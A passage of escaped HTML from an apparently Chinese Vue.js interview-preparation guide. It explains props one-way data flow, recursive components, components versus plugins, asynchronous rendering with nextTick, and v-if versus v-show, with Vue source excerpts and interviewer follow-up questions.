class=\\"language-html\\"><code>&lt;div&gt;\\n   &lt;Child&gt;来自父组件内容&lt;/Child&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<p>如果要精确分发到不同位置可以使用<code>具名插槽</code>，如果要使用子组件中的数据可以使用作用域插槽</p>\\n<ol start=\\"4\\">\\n<li>组件选项中还有一个不太常用的选项<code>extends</code>，也可以起到扩展组件的目的</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>// 扩展对象\\nconst myextends = {\\n   methods: {\\n      dosomething(){}\\n   }\\n}\\n// 组件扩展：做数组项设置到extends选项，仅作用于当前组件\\n// 跟混入的不同是它只能扩展单个对象\\n// 另外如果和混入发生冲突，该选项优先级较高，优先起作用\\nconst Comp = {\\n   extends: myextends\\n}\\n</code></pre>\\n<ol start=\\"5\\">\\n<li>混入的数据和方法不能明确判断来源且可能和当前组件内变量产生命名冲突，<code>vue3</code>中引入的<code>composition api</code>，可以很好解决这些问题，利用独立出来的响应式模块可以很方便的编写独立逻辑并提供响应式的数据，然后在<code>setup</code>选项中组合使用，增强代码的可读性和维护性。例如</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>// 复用逻辑1\\nfunction useXX() {}\\n// 复用逻辑2\\nfunction useYY() {}\\n// 逻辑组合\\nconst Comp = {\\n   setup() {\\n      const {xx} = useXX()\\n      const {yy} = useYY()\\n      return {xx, yy}\\n   }\\n}\\n</code></pre>\\n<h3 id=\\"子组件可以直接改变父组件的数据么-说明原因\\"><a class=\\"header-anchor\\" href=\\"#子组件可以直接改变父组件的数据么-说明原因\\">#</a> 子组件可以直接改变父组件的数据么，说明原因</h3>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>不应直接修改 <code>props</code>：数据所有权在父组件，子组件应通过 <code>emit</code> 请求父组件更新</li>\\n<li>父组件重新渲染时会把新 <code>props</code> 向下覆盖，子组件的本地篡改既可能丢失，也会让数据来源难以追踪</li>\\n<li>对象和数组 <code>props</code> 传的是同一个引用，深层属性技术上可能改得动，但仍然破坏单向数据流</li>\\n<li>编辑表单可用组件 <code>v-model</code>；草稿型复杂对象则先拷贝到本地，保存时一次性上报</li>\\n</ul>\\n<p><strong>子组件不应该直接修改父组件通过 <code>props</code> 传下来的数据，而应通过 <code>emit</code> 通知父组件更新。</strong> <code>props</code> 遵循单向数据流，父组件再次渲染时会用最新值向下刷新，子组件私自修改不仅可能被覆盖，也会让状态来源难以追踪。若属性只是初始值，可以用它初始化本地 <code>ref</code>；若只需转换展示，则用计算属性。对象和数组的深层属性虽然技术上可能改得动，但仍会破坏数据所有权边界。</p>\\n</section>\\n<p>这是一个实践知识点，组件化开发过程中有个<code>单项数据流原则</code>，不在子组件中修改父组件是个常识问题</p>\\n<p><strong>思路</strong></p>\\n<ul>\\n<li>讲讲单项数据流原则，表明为何不能这么做</li>\\n<li>举几个常见场景的例子说说解决方案</li>\\n<li>结合实践讲讲如果需要修改父组件状态应该如何做</li>\\n</ul>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li>所有的 <code>prop</code> 都使得其父子之间形成了一个单向下行绑定：父级 <code>prop</code> 的更新会向下流动到子组件中，但是反过来则不行。这样会防止从子组件意外变更父级组件的状态，从而导致你的应用的数据流向难以理解。另外，每次父级组件发生变更时，子组件中所有的 <code>prop</code> 都将会刷新为最新的值。这意味着你不应该在一个子组件内部改变 <code>prop</code>。如果你这样做了，<code>Vue</code> 会在浏览器控制台中发出警告</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>const props = defineProps([&#39;foo&#39;])\\n// ❌ 下面行为会被警告, props是只读的!\\nprops.foo = &#39;bar&#39;\\n</code></pre>\\n<ol start=\\"2\\">\\n<li>实际开发过程中有两个场景会想要修改一个属性：</li>\\n</ol>\\n<p><strong>这个 prop 用来传递一个初始值；这个子组件接下来希望将其作为一个本地的 prop 数据来使用。</strong> 在这种情况下，最好定义一个本地的 <code>data</code>，并将这个 <code>prop</code> 用作其初始值：</p>\\n<pre class=\\"language-js\\"><code>const props = defineProps([&#39;initialCounter&#39;])\\nconst counter = ref(props.initialCounter)\\n</code></pre>\\n<p><strong>这个 prop 以一种原始的值传入且需要进行转换。</strong> 在这种情况下，最好使用这个 <code>prop</code> 的值来定义一个计算属性：</p>\\n<pre class=\\"language-js\\"><code>const props = defineProps([&#39;size&#39;])\\n// prop变化，计算属性自动更新\\nconst normalizedSize = computed(() =&gt; props.size.trim().toLowerCase())\\n</code></pre>\\n<ol start=\\"3\\">\\n<li>实践中如果确实想要改变父组件属性应该<code>emit</code>一个事件让父组件去做这个变更。注意虽然我们不能直接修改一个传入的对象或者数组类型的<code>prop</code>，但是我们还是能够直接改内嵌的对象或属性</li>\\n</ol>\\n<h3 id=\\"什么是递归组件-举个例子说明下\\"><a class=\\"header-anchor\\" href=\\"#什么是递归组件-举个例子说明下\\">#</a> 什么是递归组件？举个例子说明下？</h3>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>递归组件是组件在自己的模板中再渲染自身，适合树菜单、评论树、文件目录等嵌套数据</li>\\n<li>递归必须有终止条件，通常是 <code>children.length === 0</code> 时不再渲染子组件</li>\\n<li>每层用稳定业务 <code>key</code>，并将展开状态按节点 <code>id</code> 管理，避免节点复用错位</li>\\n<li>过深或异常成环的数据会造成性能问题甚至无限递归，生产中要校验数据并考虑懒加载子节点</li>\\n</ul>\\n<p><strong>递归组件就是一个组件在自己的模板中再次渲染自己，常用于树、菜单这类层级结构。</strong> 比如 <code>TreeItem</code> 渲染当前节点后，再遍历 <code>model.children</code>，为每个子节点继续渲染 <code>TreeItem</code>。组件需要能通过名称找到自身，单文件组件也可以由文件名推断这个名称。递归必须设置结束条件，例如没有 <code>children</code> 时停止，否则异常数据可能导致无限递归。</p>\\n</section>\\n<p><strong>分析</strong></p>\\n<p>递归组件我们用的比较少，但是在<code>Tree</code>、<code>Menu</code>这类组件中会被用到。</p>\\n<p><strong>体验</strong></p>\\n<p>组件通过组件名称引用它自己，这种情况就是递归组件</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n  &lt;li&gt;\\n    &lt;div&gt; {{ model.name }}&lt;/div&gt;\\n    &lt;ul v-show=&quot;isOpen&quot; v-if=&quot;isFolder&quot;&gt;\\n      &lt;!-- 注意这里：组件递归渲染了它自己 --&gt;\\n      &lt;TreeItem\\n        class=&quot;item&quot;\\n        v-for=&quot;model in model.children&quot;\\n        :model=&quot;model&quot;&gt;\\n      &lt;/TreeItem&gt;\\n    &lt;/ul&gt;\\n  &lt;/li&gt;\\n&lt;script&gt;\\nexport default {\\n  name: &#39;TreeItem&#39;,\\n  // ...\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li>如果某个组件通过组件名称引用它自己，这种情况就是递归组件。</li>\\n<li>实际开发中类似<code>Tree</code>、<code>Menu</code>这类组件，它们的节点往往包含子节点，子节点结构和父节点往往是相同的。这类组件的数据往往也是树形结构，这种都是使用递归组件的典型场景。</li>\\n<li>使用递归组件时，由于我们并未也不能在组件内部导入它自己，所以设置组件<code>name</code>属性，用来查找组件定义，如果使用<code>SFC</code>，则可以通过<code>SFC</code>文件名推断。组件内部通常也要有递归结束条件，比如<code>model.children</code>这样的判断。</li>\\n<li>查看生成渲染函数可知，递归组件查找时会传递一个布尔值给<code>resolveComponent</code>，这样实际获取的组件就是当前组件本身</li>\\n</ol>\\n<p><strong>原理</strong></p>\\n<p>递归组件编译结果中，获取组件时会传递一个标识符 <code>_resolveComponent(&quot;Comp&quot;, true)</code></p>\\n<pre class=\\"language-js\\"><code>const _component_Comp = _resolveComponent(&quot;Comp&quot;, true)\\n</code></pre>\\n<p>就是在传递<code>maybeSelfReference</code></p>\\n<pre class=\\"language-js\\"><code>export function resolveComponent(\\n  name: string,\\n  maybeSelfReference?: boolean\\n): ConcreteComponent | string {\\n  return resolveAsset(COMPONENTS, name, true, maybeSelfReference) || name\\n}\\n</code></pre>\\n<p><code>resolveAsset</code>中最终返回的是组件自身：</p>\\n<pre class=\\"language-js\\"><code>if (!res &amp;&amp; maybeSelfReference) {\\n    // fallback to implicit self-reference\\n    return Component\\n}\\n</code></pre>\\n<h3 id=\\"vue中组件和插件有什么区别\\"><a class=\\"header-anchor\\" href=\\"#vue中组件和插件有什么区别\\">#</a> Vue中组件和插件有什么区别</h3>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>组件是视图单元，有 <code>props</code> / <code>slots</code> / <code>emit</code> 和自己的渲染生命周期，通过模板组合到页面中</li>\\n<li>插件是安装协议，暴露 <code>install(app, options)</code>，用于一次性注册组件、指令、<code>provide</code> 或 <code>globalProperties</code></li>\\n<li>一个组件库可以包装成插件批量注册，但“插件”指的是安装方式，不是视图形态</li>\\n<li>应用级副作要可控：能局部导入组件就不要全量 <code>app.use()</code>，否则会影响 <code>Tree Shaking</code> 和依赖可见性</li>\\n</ul>\\n<p><strong>组件是组成页面和业务的可复用单元，插件则是给 <code>Vue</code> 或整个应用统一扩展能力的安装机制。</strong> 组件通常包含模板、逻辑和样式，通过全局或局部注册后放进页面使用，重点是封装职责、降低耦合。插件需要暴露 <code>install</code>，再通过 <code>Vue.use()</code> 或 <code>app.use()</code> 安装，可集中注册组件、指令、全局属性等能力。组件库可以包装成插件批量安装，但插件描述的是安装和扩展方式，本身不等同于视图组件。</p>\\n</section>\\n<p><strong>1. 组件是什么</strong></p>\\n<p>组件就是把图形、非图形的各种逻辑均抽象为一个统一的概念（组件）来实现开发的模式，在Vue中每一个.vue文件都可以视为一个组件</p>\\n<p><strong>组件的优势</strong></p>\\n<ul>\\n<li>降低整个系统的耦合度，在保持接口不变的情况下，我们可以替换不同的组件快速完成需求，例如输入框，可以替换为日历、时间、范围等组件作具体的实现</li>\\n<li>调试方便，由于整个系统是通过组件组合起来的，在出现问题的时候，可以用排除法直接移除组件，或者根据报错的组件快速定位问题，之所以能够快速定位，是因为每个组件之间低耦合，职责单一，所以逻辑会比分析整个系统要简单</li>\\n<li>提高可维护性，由于每个组件的职责单一，并且组件在系统中是被复用的，所以对代码进行优化可获得系统的整体升级</li>\\n</ul>\\n<p><strong>2. 插件是什么</strong></p>\\n<p>插件通常用来为 <code>Vue</code> 添加全局功能。插件的功能范围没有严格的限制——一般有下面几种：</p>\\n<ul>\\n<li>添加全局方法或者属性。如: <code>vue-custom-element</code></li>\\n<li>添加全局资源：指令/过滤器/过渡等。如 <code>vue-touch</code></li>\\n<li>通过全局混入来添加一些组件选项。如<code>vue-router</code></li>\\n<li>添加 <code>Vue</code> 实例方法，通过把它们添加到 <code>Vue.prototype</code> 上实现。</li>\\n<li>一个库，提供自己的 <code>API</code>，同时提供上面提到的一个或多个功能。如<code>vue-router</code></li>\\n</ul>\\n<p><strong>3. 两者的区别</strong></p>\\n<p>两者的区别主要表现在以下几个方面：</p>\\n<ul>\\n<li>编写形式</li>\\n<li>注册形式</li>\\n<li>使用场景</li>\\n</ul>\\n<p><strong>3.1 编写形式</strong></p>\\n<p><strong>编写组件</strong></p>\\n<p>编写一个组件，可以有很多方式，我们最常见的就是vue单文件的这种格式，每一个<code>.vue</code>文件我们都可以看成是一个组件</p>\\n<p>vue文件标准格式</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n&lt;/template&gt;\\n&lt;script&gt;\\nexport default{ \\n    ...\\n}\\n&lt;/script&gt;\\n&lt;style&gt;\\n&lt;/style&gt;\\n</code></pre>\\n<p>我们还可以通过<code>template</code>属性来编写一个组件，如果组件内容多，我们可以在外部定义<code>template</code>组件内容，如果组件内容并不多，我们可直接写在<code>template</code>属性上</p>\\n<pre class=\\"language-html\\"><code>&lt;template id=&quot;testComponent&quot;&gt;     // 组件显示的内容\\n    &lt;div&gt;component!&lt;/div&gt;   \\n&lt;/template&gt;\\n\\nVue.component(&#39;componentA&#39;,{ \\n    template: &#39;#testComponent&#39;  \\n    template: `&lt;div&gt;component&lt;/div&gt;`  // 组件内容少可以通过这种形式\\n})\\n</code></pre>\\n<p><strong>编写插件</strong></p>\\n<p><code>vue</code>插件的实现应该暴露一个 <code>install</code> 方法。这个方法的第一个参数是 <code>Vue</code> 构造器，第二个参数是一个可选的选项对象</p>\\n<pre class=\\"language-js\\"><code>MyPlugin.install = function (Vue, options) {\\n  // 1. 添加全局方法或 property\\n  Vue.myGlobalMethod = function () {\\n    // 逻辑...\\n  }\\n\\n  // 2. 添加全局资源\\n  Vue.directive(&#39;my-directive&#39;, {\\n    bind (el, binding, vnode, oldVnode) {\\n      // 逻辑...\\n    }\\n    ...\\n  })\\n\\n  // 3. 注入组件选项\\n  Vue.mixin({\\n    created: function () {\\n      // 逻辑...\\n    }\\n    ...\\n  })\\n\\n  // 4. 添加实例方法\\n  Vue.prototype.$myMethod = function (methodOptions) {\\n    // 逻辑...\\n  }\\n}\\n</code></pre>\\n<p><strong>3.2 注册形式</strong></p>\\n<p><strong>组件注册</strong></p>\\n<p>vue组件注册主要分为<strong>全局注册</strong>与<strong>局部注册</strong></p>\\n<p>全局注册通过<code>Vue.component</code>方法，第一个参数为组件的名称，第二个参数为传入的配置项</p>\\n<pre class=\\"language-js\\"><code>Vue.component(&#39;my-component-name&#39;, { /* ... */ })\\n</code></pre>\\n<p>局部注册只需在用到的地方通过<code>components</code>属性注册一个组件</p>\\n<pre class=\\"language-js\\"><code>const component1 = {...} // 定义一个组件\\n\\nexport default {\\n\\tcomponents:{\\n\\t\\tcomponent1   // 局部注册\\n\\t}\\n}\\n</code></pre>\\n<p><strong>插件注册</strong></p>\\n<p>插件的注册通过<code>Vue.use()</code>的方式进行注册（安装），第一个参数为插件的名字，第二个参数是可选择的配置项</p>\\n<pre class=\\"language-js\\"><code>Vue.use(插件名字,{ /* ... */} )\\n</code></pre>\\n<p>注意的是：</p>\\n<p>注册插件的时候，需要在调用 <code>new Vue()</code> 启动应用之前完成</p>\\n<p><code>Vue.use</code>会自动阻止多次注册相同插件，只会注册一次</p>\\n<p><strong>4. 使用场景</strong></p>\\n<ul>\\n<li>组件 (Component) 是用来构成你的 App 的业务模块，它的目标是 <code>App.vue</code></li>\\n<li>插件 (Plugin) 是用来增强你的技术栈的功能模块，它的目标是 Vue 本身</li>\\n</ul>\\n<p>简单来说，插件就是指对<code>Vue</code>的功能的增强或补充</p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>团队把订单金额展示封装成插件，通过全局混入给每个页面注入模板逻辑；评审时你为什么可能要求改成组件？</strong></p>\\n<p>金额展示属于构成页面的可复用界面与业务模块，更适合封装成职责单一的组件，由使用方显式组合。全局混入会影响所有组件，依赖来源也更隐蔽；只有确实需要增强整个 <code>Vue</code> 技术栈时，插件的全局安装方式才更匹配。</p>\\n</li>\\n<li>\\n<p><strong>公司要给 20 个页面统一提供权限指令和实例方法，这套能力应做成普通组件还是插件？</strong></p>\\n<p>应优先做成插件，因为它提供的是跨应用的全局指令和实例能力，而不是一块可渲染界面。插件通过 <code>install</code> 接收 <code>Vue</code> 构造器及可选配置，再注册全局资源或实例方法；代价是全局影响较大，命名和行为必须保持克制。</p>\\n</li>\\n<li>\\n<p><strong>一个 <code>Vue</code> 2 插件已经写好 <code>install(Vue, options)</code>，但业务在 <code>new Vue()</code> 之后才执行 <code>Vue.use()</code>，部分首屏组件拿不到实例方法；怎么修？</strong></p>\\n<p>应把 <code>Vue.use(MyPlugin, options)</code> 移到创建根实例之前，确保首屏组件初始化时全局能力已经安装。<code>Vue.use</code> 会避免同一插件被重复注册，但这不能修复安装时机过晚的问题；插件若依赖启动配置，也应在这一阶段一次传入。</p>\\n</li>\\n<li>\\n<p><strong>局部页面只使用一次日期选择器，同事坚持通过插件全局注册；你会怎样权衡？</strong></p>\\n<p>只在单个页面使用的可视模块应优先局部注册组件，让依赖范围和打包边界更清晰。全局插件适合添加全局方法、资源、混入或一组统一 <code>API</code>；为一次性组件扩大整个应用的可见范围，会增加命名冲突和维护成本。</p>\\n</li>\\n<li>\\n<p><strong>线上所有页面的 <code>created</code> 都多执行了一段埋点逻辑，排查发现某插件调用了 <code>Vue.mixin</code>；怎样确认责任边界？</strong></p>\\n<p>先检查插件的 <code>install</code> 是否注册了全局混入，因为它会把选项注入后续创建的每个组件，而不是只影响主动使用的页面。若埋点并非全局需求，应改为局部组件、指令或显式调用；保留混入则必须接受影响面大、调试来源隐蔽的代价。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_18-为什么vue采用异步渲染\\"><a class=\\"header-anchor\\" href=\\"#_18-为什么vue采用异步渲染\\">#</a> 18 为什么Vue采用异步渲染</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>目的：把一轮同步代码里的<strong>多次数据修改合并成一次渲染</strong>，中间状态用户看不到，渲染它们纯属浪费</li>\\n<li>流程：<code>setter</code> → <code>dep.notify</code> → <code>queueWatcher</code> 按 id <strong>去重</strong>入队 → <code>nextTick</code> 在<strong>微任务</strong>里批量 flush</li>\\n<li>队列按 <code>Watcher</code> 的 id <strong>排序</strong>，保证父组件先于子组件更新（父的更新可能让子组件直接被销毁）</li>\\n<li>用微任务而不是宏任务：本轮事件循环末尾、浏览器绘制之前执行，不会多等一帧</li>\\n<li>直接后果就是&quot;改完数据同步读 <code>DOM</code> 拿到旧值&quot;，所以才需要 <code>nextTick</code></li>\\n</ul>\\n<p><strong><code>Vue</code> 采用异步渲染，是为了把一轮同步代码中的多次状态修改合并成一次视图更新。</strong> 如果每次赋值都立即执行渲染和补丁，中间结果用户看不到，却会产生重复工作。更新时，同一 <code>Watcher</code> 会按 <code>id</code> 去重入队，队列排序后由 <code>nextTick</code> 在微任务中统一刷新，并保证父组件优先于子组件更新。代价是修改数据后同步读取 <code>DOM</code> 仍可能得到旧值，此时要等 <code>nextTick</code> 再读取。</p>\\n</section>\\n<p><strong>核心理由：把一轮同步代码里的多次数据修改，合并成一次渲染。</strong></p>\\n<p>假设一个方法里连改了五个响应式数据：</p>\\n<pre class=\\"language-js\\"><code>methods: {\\n  updateAll() {\\n    this.a = 1\\n    this.b = 2\\n    this.c = 3   // 如果同步渲染，这里已经重新渲染三次了\\n  },\\n}\\n</code></pre>\\n<p>同步渲染意味着每改一次就重新执行 <code>render</code> + <code>patch</code> 一次 —— 中间那些结果用户根本看不到，纯粹是浪费。异步批量之后，这三次修改只触发一次渲染。</p>\\n<p><strong>它是怎么做到的？</strong></p>\\n<pre class=\\"language-text\\"><code>setter 触发 → dep.notify()\\n  → 遍历 subs 调用 watcher.update()\\n    → queueWatcher(watcher)：按 id 去重后推入队列\\n      → nextTick(flushSchedulerQueue)：在微任务里统一执行\\n        → 队列按 id 排序（保证父组件先于子组件更新）\\n        → 依次运行 watcher.run() 重新渲染\\n</code></pre>\\n<p>三个关键设计：</p>\\n<ol>\\n<li><strong>按 <code>id</code> 去重</strong> —— 同一个组件的多个数据变了，队列里只会有一个渲染 <code>Watcher</code>。</li>\\n<li><strong>按 <code>id</code> 排序</strong> —— <code>Watcher</code> 的 <code>id</code> 是自增的，父组件先创建所以 <code>id</code> 更小，排序保证父组件先更新。如果父组件的更新导致子组件被销毁，子组件的更新就可以直接跳过。</li>\\n<li><strong>走微任务而不是宏任务</strong> —— 微任务在本轮事件循环末尾、浏览器渲染之前执行，所以用户不会看到中间状态，也不会额外多等一帧。</li>\\n</ol>\\n<p><strong>这个设计带来的直接后果就是 <code>nextTick</code>：</strong></p>\\n<pre class=\\"language-js\\"><code>this.msg = &#39;new&#39;\\nconsole.log(this.$el.textContent)              // 还是旧的\\nthis.$nextTick(() =&gt; console.log(this.$el.textContent))  // 新的 ✅\\n</code></pre>\\n<p><strong>同样的思路在别处也能看到</strong>：<code>React 18</code> 的自动批处理、浏览器自己的样式计算合并，都是&quot;把一批变更攒起来一次性处理&quot;。理解这一条，很多框架的行为就不需要单独记了。</p>\\n<p>下面是源码调用链的细节：</p>\\n<blockquote>\\n<p>Vue 是组件级更新，如果不采用异步更新，那么每次更新数据都会对当前组件进行重新渲染，所以为了性能， Vue 会在本轮数据更新后，在异步更新视图。核心思想 <code>nextTick</code></p>\\n</blockquote>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/0b0716bd40a4ce7c.png\\" alt=\\"\\"></p>\\n<p>源码相关</p>\\n<blockquote>\\n<p><code>dep.notify（）</code> 通知 <code>watcher</code>进行更新， <code>subs[i].update</code> 依次调用 <code>watcher</code> 的 <code>update</code> ， <code>queueWatcher</code> 将<code>watcher</code> 去重放入队列， <code>nextTick</code>（ <code>flushSchedulerQueue</code> ）在下一<code>tick</code>中刷新<code>watcher</code>队列（异步）</p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>update () { /* istanbul ignore else */ \\n    if (this.lazy) { \\n        this.dirty = true \\n    } \\n    else if (this.sync) { \\n        this.run() \\n    } \\n    else { \\n        queueWatcher(this); // 当数据发生变化时会将watcher放到一个队列中批量更新 \\n    }\\n}\\n\\nexport function queueWatcher (watcher: Watcher) { \\n    const id = watcher.id // 会对相同的watcher进行过滤 \\n    if (has[id] == null) { \\n        has[id] = true \\n        if (!flushing) { \\n            queue.push(watcher) \\n        } else { \\n            let i = queue.length - 1 \\n            while (i &gt; index &amp;&amp; queue[i].id &gt; watcher.id) { \\n                i-- \\n            }\\n            queue.splice(i + 1, 0, watcher) \\n        }\\n        // queue the flush \\n        if (!waiting) { \\n            waiting = true \\n            if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; !config.async) { \\n                flushSchedulerQueue() \\n                return \\n            }\\n            nextTick(flushSchedulerQueue) // 调用nextTick方法 批量的进行更新 \\n        } \\n    } \\n}\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>商品编辑页里连续执行 <code>this.price = 99</code>、<code>this.stock = 20</code>、<code>this.status = \'online\'</code>，产品经理认为界面必须同步刷新三次才算正确，你怎么反驳？</strong></p>\\n<p>用户只需要看到这一轮同步代码执行后的最终状态，三次同步执行 <code>render</code> 和 <code>patch</code> 会产生两个不可见的中间结果。<code>Vue</code> 将同一渲染 <code>Watcher</code> 按 <code>id</code> 去重，并在微任务中统一刷新；代价是赋值后立刻读取 <code>DOM</code> 仍会得到旧值。</p>\\n</li>\\n<li>\\n<p><strong>批量导入页一次循环修改一千个响应式字段，监控显示最终只渲染一次，开发者据此判断它和修改一个字段开销相同，这个结论成立吗？</strong></p>\\n<p>不成立，异步队列主要合并的是组件渲染次数，不会让每次响应式赋值本身消失。每个 <code>setter</code> 仍可能触发 <code>dep.notify()</code> 并遍历订阅者，数据量大时应先在普通数据上完成计算，再整体替换响应式结果。</p>\\n</li>\\n<li>\\n<p><strong>订单页更新状态后马上执行 <code>document.querySelector(\'.status\').textContent</code>，线上日志总是旧值，但页面稍后显示正常，你会怎样定位并修改？</strong></p>\\n<p>这是异步刷新时序，不是响应式失效：赋值只把渲染 <code>Watcher</code> 放入队列，<code>DOM</code> 要到 <code>nextTick(flushSchedulerQueue)</code> 才更新。把依赖新 <code>DOM</code> 的读取放进 <code>$nextTick</code>；若业务只需要新数据，应直接读取状态而不是等待 <code>DOM</code>。</p>\\n</li>\\n<li>\\n<p><strong>父组件关闭弹窗的同时，弹窗里的子组件也因数据变化进入更新队列；如果队列不按 <code>Watcher.id</code> 排序，可能出现什么现象？</strong></p>\\n<p>子组件可能先完成一次渲染，随后又被父组件更新销毁，形成无意义的工作。<code>Watcher.id</code> 自增且父组件通常先创建，排序后可保证父先子后，并在父更新移除子组件时跳过其更新；这一判断依赖正常的组件创建顺序。</p>\\n</li>\\n<li>\\n<p><strong>架构评审中有人建议把调度从微任务改成宏任务，理由是同样能批量更新；对输入联想页而言，两者体验为什么可能不同？</strong></p>\\n<p>宏任务也能合并修改，但它通常要等到下一轮事件循环，可能让视图额外晚一拍。微任务会在本轮同步代码结束后、浏览器渲染前刷新，因此既能去重又不暴露中间状态；微任务中的 <code>DOM</code> 读取仍需遵守 <code>nextTick</code> 时序。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_19-v-if和v-show区别\\"><a class=\\"header-anchor\\" href=\\"#_19-v-if和v-show区别\\">#</a> 19 v-if和v-show区别</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>v-if</code> 控制<strong>元素在不在</strong>：假值时组件被销毁、<code>DOM</code> 被移除，切换有创建/销毁开销</li>\\n<li><code>v-show</code> 控制 <code>display: none</code>：元素始终在 <code>DOM</code> 里，切换只改样式，开销极小</li>\\n<li><code>v-if</code> 是惰性的 —— 初始为假时压根不渲染；<code>v-show</code> 无论如何都会渲染一次</li>\\n<li>选型：切换频繁用 <code>v-show</code>，条件很少变或初始就不需要用 <code>v-if</code></li>\\n<li>⚠️ <code>v-if</code> 销毁组件会<strong>丢失内部状态</strong>（表单填的内容、滚动位置），要保留就用 <code>v-show</code> 或 <code>keep-alive</code></li>\\n</ul>\\n<p><strong><code>v-if</code> 决定元素是否创建，<code>v-show</code> 只通过 <code>display: none</code> 控制元素是否可见。</strong> <code>v-if</code> 为假时不会渲染，切换时还要销毁或重建子组件和事件监听，因此切换成本更高。<code>v-show</code> 无论初始条件如何都会渲染，后续只改样式，也不会因为显隐切换触发组件生命周期。频繁切换时我一般用 <code>v-show</code>，条件很少变化或初始无需渲染时用 <code>v-if</code>。</p>\\n</section>\\n<ul>\\n<li><code>v-show</code>隐藏则是为该元素添加<code>css--display:none</code>，<code>dom</code>元素依旧还在。<code>v-if</code>显示隐藏是将<code>dom</code>元素整个添加或删除</li>\\n<li>编译过程：<code>v-if</code>切换有一个局部编译/卸载的过程，切换过程中合适地销毁和重建内部的事件监听和子组件；<code>v-show</code>只是简单的基于<code>css</code>切换</li>\\n<li>编译条件：<code>v-if</code>是真正的条件渲染，它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。只有渲染条件为假时，并不做操作，直到为真才渲染</li>\\n<li><code>v-show</code> 由<code>false</code>变为<code>true</code>的时候不会触发组件的生命周期</li>\\n<li><code>v-if</code>由<code>false</code>变为<code>true</code>的时候，触发组件的<code>beforeCreate</code>、<code>create</code>、<code>beforeMount</code>、<code>mounted</code>钩子，由<code>true</code>变为<code>false</code>的时候触发组件的<code>beforeDestory</code>、<code>destoryed</code>方法</li>\\n<li>性能消耗：<code>v-if</code>有更高的切换消耗；<code>v-show</code>有更高的初始渲染消耗</li>\\n</ul>\\n<p><strong>v-show与v-if的使用场景</strong></p>\\n<ul>\\n<li><code>v-if</code> 与 <code>v-show</code> 都能控制<code>dom</code>元素在页面的显示</li>\\n<li><code>v-if</code> 相比 <code>v-show</code> 开销更大的（直接操作<code>dom节</code>点增加与删除）</li>\\n<li>如果需要非常频繁地切换，则使用 <code>v-show</code> 较好</li>\\n<li>如果在运行时条件很少改变，则使用 <code>v-if</code> 较好</li>\\n</ul>\\n<p><strong>v-show与v-if原理分析</strong></p>\\n<ol>\\n<li><code>v-show</code>原理</li>\\n</ol>\\n<p>不管初始条件是什么，元素总是会被渲染</p>\\n<p>我们看一下在vue中是如何实现的</p>\\n<p>代码很好理解，有<code>transition</code>就执行<code>transition</code>，没有就直接设置<code>display</code>属性</p>\\n<pre class=\\"language-js\\"><code>// https://github.com/vuejs/vue-next/blob/3cd30c5245da0733f9eb6f29d220f39c46518162/packages/runtime-dom/src/directives/vShow.ts\\nexport const vShow: ObjectDirective&lt;VShowElement&gt; = {\\n  beforeMount(el, { value }, { transition }) {\\n    el._vod = el.style.display === &#39;none&#39; ? &#39;&#39; : el.style.display\\n    if (transition &amp;&amp; value) {\\n      transition.beforeEnter(el)\\n    } else {\\n      setDisplay(el, value)\\n    }\\n  },\\n  mounted(el, { value }, { transition }) {\\n    if (transition &amp;&amp; value) {\\n      transition.enter(el)\\n    }\\n  },\\n  updated(el, { value, oldValue }, { transition }) {\\n    // ...\\n  },\\n  beforeUnmount(el, { value }) {\\n    setDisplay(el, value)\\n  }\\n}\\n</code></pre>\\n<ol start=\\"2\\">\\n<li><code>v-if</code>原理</li>\\n</ol>\\n<p><code>v-if</code>在实现上比<code>v-show</code>要复杂的多，因为还有<code>else</code> <code>else-if</code> 等条件需要处理，这里我们也只摘抄源码中处理 <code>v-if</code> 的一小部分</p>\\n<p>返回一个<code>node</code>节点，<code>render</code>函数通过表达式的值来决定是否生成<code>DOM</code></p>\\n<pre class=\\"language-js\\"><code>// https://github.com/vuejs/vue-next/blob/cdc9f336fd/packages/compiler-core/src/transforms/vIf.ts\\nexport const transformIf = createStructuralDirectiveTransform(\\n  /^(if|else|else-if)$/,\\n  (node, dir, context) =&gt; {\\n    return processIf(node, dir, context, (ifNode, branch, isRoot) =&gt; {\\n      // ...\\n      return () =&gt; {\\n        if (isRoot) {\\n          ifNode.codegenNode = createCodegenNodeForBranch(\\n            branch,\\n            key,\\n            context\\n          ) as IfConditionalExpression\\n        } else {\\n          // attach this branch&#39;s codegen node to the v-if root.\\n          const parentCondition = getParentCondition(ifNode.codegenNode!)\\n          parentCondition.alternate = createCodegenNodeForBranch(\\n            branch,\\n            key + ifNode.branches.length - 1,\\n            context\\n          )\\n        }\\n      }\\n    })\\n  }\\n)\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 